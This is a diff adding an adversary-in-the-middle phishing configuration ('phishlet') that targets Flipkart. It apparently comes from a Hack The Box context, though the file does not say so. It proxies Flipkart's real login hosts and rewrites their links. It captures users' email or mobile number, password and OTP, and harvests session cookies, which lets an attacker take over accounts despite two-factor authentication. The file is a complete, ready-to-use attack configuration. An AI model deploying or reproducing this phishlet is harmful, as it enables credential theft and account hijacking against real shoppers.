@@ -1,0 +1,49 @@
+name: 'Flipkart Phishlet'
+author: 'HTB'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'flipkart.com', session: true, is_landing: true }
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'flipkart.com', session: true, is_landing: false }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'flipkart.com', session: false, is_landing: false }
+  - { phish_sub: 'rukminim1', orig_sub: 'rukminim1', domain: 'flixcart.com', session: false, is_landing: false }
+  - { phish_sub: 'rukminim2', orig_sub: 'rukminim2', domain: 'flixcart.com', session: false, is_landing: false }
+
+sub_filters: 
+  - { triggers_on: 'www.flipkart.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'flipkart.com', search: 'www.flipkart.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { triggers_on: 'www.flipkart.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'flipkart.com', search: 'accounts.flipkart.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'www.flipkart.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'flipkart.com', search: 'static.flipkart.com', replace: 'static.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'www.flipkart.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'flipkart.com', search: 'rukminim1.flixcart.com', replace: 'rukminim1.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'www.flipkart.com', orig_sub: 'www', hostname: '{hostname}', sub: 'www', domain: 'flipkart.com', search: 'rukminim2.flixcart.com', replace: 'rukminim2.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'accounts.flipkart.com', orig_sub: 'accounts', hostname: '{hostname}', sub: 'accounts', domain: 'flipkart.com', search: 'www.flipkart.com', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: 'flipkart.com'
+    keys: ['T', 'SN', 'S', 'AMCV_17EB401053DAF4840A490D4C', 'DID', '_fbp']
+
+credentials:
+  username:
+    key: 'email_mobile'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'otp'
+      search: '(.*)'
+      type: 'post'
+
+auth_urls:
+  - 'https://{hostname}/account/.*'
+  - 'https://accounts.{hostname}/api/auth'
+  - 'https://{hostname}/api/.*login.*'
+
+login:
+  domain: 'www.flipkart.com'
+  path: '/account/login'
+  url: 'https://www.flipkart.com/account/login'
+
+# This is a Flipkart phishlet configured for www.flipkart.com
+# Note: May need adjustment based on Flipkart's current authentication flow
